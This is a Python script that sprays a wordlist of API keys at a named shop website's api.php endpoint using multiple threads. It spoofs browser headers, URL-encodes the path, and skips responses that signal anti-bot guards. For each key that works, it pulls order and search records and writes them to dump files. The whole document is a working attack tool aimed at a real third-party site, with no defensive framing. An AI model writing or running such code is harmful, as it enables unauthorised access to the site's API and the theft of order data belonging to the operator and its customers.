#!/usr/bin/env python3
from __future__ import annotations
import argparse, json, time, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import requests

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36"
BASE = "https://siye.lol/shop"
TOOLS = BASE + "/%61pi.php"
WRONG = "API对接密钥错误"
EMPTY = "确保各项不能为空"
GUARD = "_guard"
tls = threading.local()

def sess():
    s = getattr(tls, "s", None)
    if s is None:
        s = requests.Session()
        s.headers.update({
            "User-Agent": UA,
            "Referer": BASE + "/",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json,text/plain,*/*",
        })
        try:
            s.get(BASE + "/", timeout=12)
        except Exception:
            pass
        tls.s = s
    return s

def fetch(key: str, timeout=7.0):
    try:
        r = sess().get(TOOLS, params={"act": "tools", "limit": "1", "key": key}, timeout=timeout)
        return key, r.status_code, r.text[:800]
    except Exception as e:
        return key, 0, f"ERR:{type(e).__name__}:{e}"

def is_hit(body: str) -> bool:
    if not body: return False
    if WRONG in body or EMPTY in body or GUARD in body or "slider_html" in body or body.startswith("ERR:"):
        return False
    return body.lstrip()[:1] in "{["

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--keys", required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--workers", type=int, default=16)
    ap.add_argument("--offset", type=int, default=0)
    ap.add_argument("--limit", type=int, default=0)
    ap.add_argument("--progress-every", type=int, default=200)
    args = ap.parse_args()
    out = Path(args.out); out.mkdir(parents=True, exist_ok=True)
    logp, hitsp, statep = out/"spray.log", out/"hits.jsonl", out/"state.json"
    keys=[ln.strip() for ln in Path(args.keys).open(errors="ignore") if ln.strip() and all(32<=ord(c)<127 for c in ln.strip())]
    if args.offset: keys=keys[args.offset:]
    if args.limit: keys=keys[:args.limit]
    lock=threading.Lock(); tested=hits=errors=guards=0; t0=time.time()
    def log(m):
        line=f"[{time.strftime('%H:%M:%S')}] {m}"
        print(line, flush=True)
        logp.open("a").write(line+"\n")
    log(f"start keys={len(keys)} workers={args.workers}")
    _,c,b=fetch("WRONGTEST"); log(f"sanity {c} {b[:120]}")
    def work(k):
        nonlocal tested,hits,errors,guards
        key,code,body=fetch(k)
        if code==0 or not body:
            time.sleep(0.2); key,code,body=fetch(k)
        with lock:
            tested += 1
            if code==0 or not body: errors += 1
            elif GUARD in body: guards += 1
            elif is_hit(body):
                hits += 1
                hitsp.open("a").write(json.dumps({"key":key,"code":code,"body":body,"ts":time.time()}, ensure_ascii=False)+"\n")
                log(f"HIT key={key!r} body={body[:300]}")
                for act in ("orders","search"):
                    try:
                        p={"act":act,"key":key,"limit":"5"}
                        if act=="search": p["id"]="1"
                        d=sess().get(TOOLS, params=p, timeout=12).text[:5000]
                        safe="".join(ch if ch.isalnum() else "_" for ch in key)[:40]
                        (out/f"dump_{act}_{safe}.json").write_text(d)
                        log(f"dump {act}: {d[:200]}")
                    except Exception as e:
                        log(f"dump {act} err {e}")
            if tested % args.progress_every == 0 or tested == len(keys):
                elapsed=max(time.time()-t0,1e-3)
                state={"tested":tested,"total":len(keys),"hits":hits,"errors":errors,"guards":guards,"rate_rps":round(tested/elapsed,2),"elapsed_s":round(elapsed,1),"last_key":key,"last_body":body[:120]}
                statep.write_text(json.dumps(state, ensure_ascii=False, indent=2))
                log(f"progress {tested}/{len(keys)} hits={hits} err={errors} guard={guards} rate={tested/elapsed:.1f}/s last={key[:32]!r}")
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        list(ex.map(work, keys, chunksize=8))
    log(f"done tested={tested} hits={hits} err={errors} guard={guards} elapsed={time.time()-t0:.1f}s")
    statep.write_text(json.dumps({"tested":tested,"total":len(keys),"hits":hits,"errors":errors,"guards":guards,"finished":True,"elapsed_s":round(time.time()-t0,1)}, indent=2))

if __name__=="__main__":
    main()
